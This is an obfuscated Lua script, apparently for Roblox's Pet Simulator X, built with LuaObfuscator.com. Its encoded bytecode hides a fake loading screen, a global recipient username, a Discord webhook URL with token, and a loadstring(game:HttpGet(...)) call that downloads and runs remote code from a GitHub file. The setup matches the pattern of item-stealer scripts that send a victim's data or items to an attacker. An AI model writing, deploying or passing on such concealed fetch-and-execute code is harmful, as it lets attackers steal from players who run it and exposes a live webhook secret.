--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=0;local v84;while true do if (v83==0) then v84=v2(v0(v30,16));if v19 then local v97=0;local v98;while true do if (v97==1) then return v98;end if (v97==0) then v98=v5(v84,v19);v19=nil;v97=1;end end else return v84;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v85=(117 -(32 + 85)) -0 ;local v86;while true do if (v85==(0 + 0)) then v86=(v31/((5 -3)^(v32-(878 -(277 + 5 + 595)))))%((3 -1)^(((v33-(1 + 0)) -(v32-(2 -(1 + 0)))) + (620 -((1512 -(892 + 65)) + 64)))) ;return v86-(v86%(1 -0)) ;end end else local v87=(1067 -(68 + (2377 -1380)))^(v32-(932 -(857 + 74))) ;return (((v31%(v87 + v87))>=v87) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=0 -0 ;local v35;while true do if (v34==(181 -(67 + 113))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (1 -(952 -(802 + 150))) ;v34=351 -(87 + 263) ;end end end local function v22()local v36=0 -0 ;local v37;local v38;while true do if (v36==((1 + 0) -0)) then return (v38 * 256) + v37 ;end if (v36==(0 + 0)) then v37,v38=v1(v16,v18,v18 + (999 -(915 + 82)) );v18=v18 + ((6 -1) -3) ;v36=1;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (1190 -(1069 + 118)) );v18=v18 + (8 -4) ;return (v42 * ((65208027 -28508318) -19922493)) + (v41 * (11394 + 53709 + 433)) + (v40 * 256) + v39 ;end local function v24()local v43=v23();local v44=v23();local v45=4 -(2 + 1) ;local v46=(v20(v44,792 -(368 + 423) ,73 -53 ) * ((6 -4)^((137 -87) -(10 + (31 -23))))) + v43 ;local v47=v20(v44,80 -59 ,473 -(4 + 412 + 26) );local v48=((v20(v44,2 + 0 + 30 )==(3 -2)) and  -1) or (1 + 0) ;if (v47==0) then if (v46==(0 -0)) then return v48 * (438 -(145 + 293)) ;else v47=431 -((1791 -(760 + 987)) + 386) ;v45=1486 -((2053 -(87 + 968)) + 488) ;end elseif (v47==2047) then return ((v46==((0 -0) + 0)) and (v48 * ((1 + 0)/(772 -(201 + (2484 -(1789 + 124))))))) or (v48 * NaN) ;end return v8(v48,v47-(929 + 94) ) * (v45 + (v46/((1140 -(116 + (1788 -(745 + 21))))^((402 -224) -126)))) ;end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==(1413 -(447 + 966))) then return "";end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v67=1818 -(1703 + 114) , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=1975 -(1913 + 62) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==2) then v57=nil;v58=nil;v52=2 + 1 ;end if ((2 + 2)==v52) then while true do if (1~=v53) then else local v95=0 + 0 ;while true do if (v95==0) then v56=nil;v57=nil;v95=1;end if (v95==(1934 -(565 + 1368))) then v53=1 + 1 ;break;end end end if (v53==(1661 -(1477 + 184))) then local v96=0 + 0 ;while true do if (v96==(0 -0)) then v54=0 + 0 ;v55=nil;v96=530 -(406 + 123) ;end if (v96==(1770 -(1749 + 20))) then v53=2 -1 ;break;end end end if (v53==(306 -(244 + 60))) then v58=nil;v59=nil;v53=3 + 0 ;end if (v53==3) then v60=nil;while true do local v99=0 + 0 ;while true do if (v99==(1002 -(938 + 63))) then if (v54~=(1323 -(1249 + 73))) then else local v147=1125 -(936 + 189) ;while true do if (v147~=(0 + 0)) then else v58={v55,v56,nil,v57};v59=v23();v147=1;end if (v147==(2 -1)) then v60={};v54=5 -3 ;break;end end end if (v54==(2 + 0)) then local v148=0;while true do if (v148==(1138 -(782 + 356))) then for v157=268 -(176 + 91) ,v59 do local v158=1900 -(106 + 1794) ;local v159;local v160;local v161;while true do if (v158~=(0 + 0)) then else v159=0 + 0 ;v160=nil;v158=2 -1 ;end if ((2 -1)~=v158) then else v161=nil;while true do if (v159==(1 + 0)) then if (v160==1) then v161=v21()~=(114 -(4 + 110)) ;elseif (v160==(6 -4)) then v161=v24();elseif (v160==(587 -(57 + 527))) then v161=v25();end v60[v157]=v161;break;end if ((1427 -(41 + 1386))==v159) then local v169=0;local v170;local v171;while true do if (v169~=(103 -(17 + 86))) then else v170=0 + 0 ;v171=nil;v169=1;end if (v169==(2 -1)) then while true do if (v170~=(0 -0)) then else v171=0;while true do if (v171~=1) then else v159=2 -1 ;break;end if (v171~=(0 -0)) then else local v180=0;local v181;while true do if (v180==0) then v181=0;while true do if (v181==(2 -1)) then v171=1 + 0 ;break;end if (v181~=(166 -(122 + 44))) then else v160=v21();v161=nil;v181=2 -1 ;end end break;end end end end break;end end break;end end end end break;end end end v58[5 -2 ]=v21();v148=3 -2 ;end if (v148==(1 + 0)) then for v162=1 + 0 ,v23() do local v163=0 -0 ;local v164;local v165;while true do if (0==v163) then v164=611 -(602 + 9) ;v165=nil;v163=1;end if (v163==(1190 -(449 + 740))) then while true do if (v164==(65 -(30 + 35))) then v165=v21();if (v20(v165,1 + 0 ,1258 -(1043 + 214) )~=(0 -0)) then else local v172=0;local v173;local v174;local v175;local v176;local v177;while true do if ((6 -4)~=v172) then else v177=nil;while true do if (v173==(1212 -(323 + 889))) then local v178=0 + 0 ;while true do if (v178==(1898 -(260 + 1638))) then v174=0 -0 ;v175=nil;v178=581 -(361 + 219) ;end if (v178==1) then v173=321 -(53 + 267) ;break;end end end if (v173==1) then local v179=0 + 0 ;while true do if (v179==(414 -(15 + 398))) then v173=984 -(18 + 964) ;break;end if (v179==(0 + 0)) then local v182=0 -0 ;while true do if (v182~=0) then else v176=nil;v177=nil;v182=2 -1 ;end if ((1 + 0)~=v182) then else v179=1206 -(902 + 303) ;break;end end end end end if ((2 + 0)~=v173) then else while true do if (v174==(851 -(20 + 830))) then local v183=0 + 0 ;local v184;while true do if ((126 -(116 + 10))~=v183) then else v184=0;while true do if (v184~=(0 + 0)) then else v177={v22(),v22(),nil,nil};if (v175==(1463 -(1404 + 59))) then local v195=0 -0 ;local v196;while true do if (v195~=(0 + 0)) then else v196=0 + 0 ;while true do if ((562 -(334 + 228))~=v196) then else v177[2 + 1 ]=v22();v177[4]=v22();break;end end break;end end elseif (v175==1) then v177[7 -4 ]=v23();elseif (v175==2) then v177[3]=v23() -((4 -2)^16) ;elseif (v175~=(5 -2)) then else local v203=1551 -(1126 + 425) ;while true do if ((405 -(118 + 287))~=v203) then else v177[11 -8 ]=v23() -(2^16) ;v177[1125 -(118 + 1003) ]=v22();break;end end end v184=1;end if (1==v184) then v174=5 -3 ;break;end end break;end end end if ((7 -4)==v174) then if (v20(v176,380 -(142 + 235) ,6 -3 )~=(4 -3)) then else v177[1 + 3 ]=v60[v177[4]];end v55[v162]=v177;break;end if (v174~=0) then else local v186=977 -(553 + 424) ;local v187;local v188;while true do if ((0 + 0)~=v186) then else v187=0 -0 ;v188=nil;v186=1 -0 ;end if (v186==1) then while true do if (v187==(0 + 0)) then v188=0 + 0 ;while true do if (v188==1) then v174=1;break;end if ((0 + 0)~=v188) then else local v197=0 -0 ;while true do if (v197~=(1 + 0)) then else v188=1;break;end if (v197==(0 + 0)) then v175=v20(v165,4 -2 ,7 -4 );v176=v20(v165,8 -4 ,4 + 2 );v197=1;end end end end break;end end break;end end end if (v174~=(851 -(254 + 595))) then else local v189=126 -(55 + 71) ;local v190;while true do if (v189==(0 + 0)) then v190=1790 -(573 + 1217) ;while true do if ((4 -3)==v190) then v174=3;break;end if (v190~=(753 -(239 + 514))) then else local v193=0 + 0 ;local v194;while true do if (v193==(0 -0)) then v194=0;while true do if (v194~=(1330 -(797 + 532))) then else v190=1 + 0 ;break;end if (v194~=(0 -0)) then else local v200=0 + 0 ;while true do if (v200~=(0 -0)) then else if (v20(v176,1203 -(373 + 829) ,732 -(476 + 255) )==(1 -0)) then v177[2]=v60[v177[1132 -(369 + 761) ]];end if (v20(v176,2 + 0 ,2)==(1 -0)) then v177[5 -2 ]=v60[v177[1889 -(927 + 959) ]];end v200=239 -(64 + 174) ;end if (v200==(1 + 0)) then v194=733 -(16 + 716) ;break;end end end end break;end end end end break;end end end end break;end end break;end if (v172==1) then v175=nil;v176=nil;v172=3 -1 ;end if (v172==(97 -(11 + 86))) then v173=0 -0 ;v174=nil;v172=286 -(175 + 110) ;end end end break;end end break;end end end v54=3 -0 ;break;end end end break;end if (v99==(0 -0)) then if (v54~=0) then else local v149=0 -0 ;while true do if (v149~=(1796 -(503 + 1293))) then else local v156=336 -(144 + 192) ;while true do if (v156~=(0 -0)) then else v55={};v56={};v156=1 + 0 ;end if ((217 -(42 + 174))==v156) then v149=1;break;end end end if (v149==(1062 -(810 + 251))) then v57={};v54=1 + 0 ;break;end end end if (v54==(3 + 0)) then local v150=0;local v151;while true do if (v150==0) then v151=0 + 0 ;while true do if (0==v151) then for v166=1,v23() do v56[v166-(1 + 0) ]=v28();end return v58;end end break;end end end v99=1 + 0 ;end end end break;end end break;end if (v52~=(1505 -(363 + 1141))) then else v55=nil;v56=nil;v52=1582 -(1183 + 397) ;end if (v52==3) then v59=nil;v60=nil;v52=11 -7 ;end if (v52==(0 + 0)) then v53=0;v54=nil;v52=1 + 0 ;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1];if (v82<=6) then if (v82<=2) then if (v82<=0) then v79[v81[2]]=v81[3]~=0 ;elseif (v82==1) then v79[v81[2]]=v81[3];else local v105=0;local v106;while true do if (0==v105) then v106=v81[2];v79[v106]=v79[v106](v13(v79,v106 + 1 ,v74));break;end end end elseif (v82<=4) then if (v82>3) then v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v73=v81[3];else local v113=v81[2];local v114=v79[v81[3]];v79[v113 + 1 ]=v114;v79[v113]=v114[v81[4]];end elseif (v82==5) then local v118;local v119,v120;local v121;local v122;v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v122=v81[2];v121=v79[v81[3]];v79[v122 + 1 ]=v121;v79[v122]=v121[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v122=v81[2];v119,v120=v72(v79[v122](v13(v79,v122 + 1 ,v81[3])));v74=(v120 + v122) -1 ;v118=0;for v141=v122,v74 do v118=v118 + 1 ;v79[v141]=v119[v118];end v73=v73 + 1 ;v81=v69[v73];v122=v81[2];v79[v122]=v79[v122](v13(v79,v122 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];v73=v81[3];else do return;end end elseif (v82<=9) then if (v82<=7) then v79[v81[2]]=v63[v81[3]];elseif (v82>8) then v73=v81[3];else local v133=v81[2];local v134,v135=v72(v79[v133](v13(v79,v133 + 1 ,v81[3])));v74=(v135 + v133) -1 ;local v136=0;for v144=v133,v74 do v136=v136 + 1 ;v79[v144]=v134[v136];end end elseif (v82<=11) then if (v82>10) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else v79[v81[2]]();end elseif (v82==12) then v79[v81[2]][v81[3]]=v81[4];else v63[v81[3]]=v79[v81[2]];end v73=v73 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!193O00028O00026O00084003023O005F4703053O00546578743303133O00436865636B696E6720536372697074733O2E03053O00546578743403123O005374617274696E67205363726970743O2E026O001040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756103083O00557365726E616D65030C3O0044656D656E746O3203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313235363835333932332O34302O383537362F674F5745737574317A726632714B55455564544556414A6833704A4639443032337735366E7072664D61584352665A5231324956784C654367344C446D345159304B3064026O00F03F027O004003053O00546578743103103O00536372697074204C6F616465643O2E03053O00546578743203153O0057616974696E6720666F72205363726970743O2E030D3O006C6F6164696E677363722O656E03103O00437573746F6D5363726970744E616D65030C3O005374617274696E672047756900293O0012013O00013O00260B3O0008000100020004093O00080001001207000100033O00300C000100040005001207000100033O00300C0001000600070012013O00083O00260B3O0012000100080004093O00120001001207000100093O0012050002000A3O00202O00020002000B00122O0004000C6O000200046O00013O00024O00010001000100044O0028000100260B3O0019000100010004093O001900010012010001000E3O00120D0001000D3O001201000100103O00120D0001000F3O0012013O00113O00260B3O0020000100120004093O00200001001207000100033O00300C000100130014001207000100033O00300C0001001500160012013O00023O00260B3O0001000100110004093O000100014O000100013O001204000100173O00122O000100033O00302O00010018001900124O00123O00044O000100012O00063O00017O00",v9(),...);end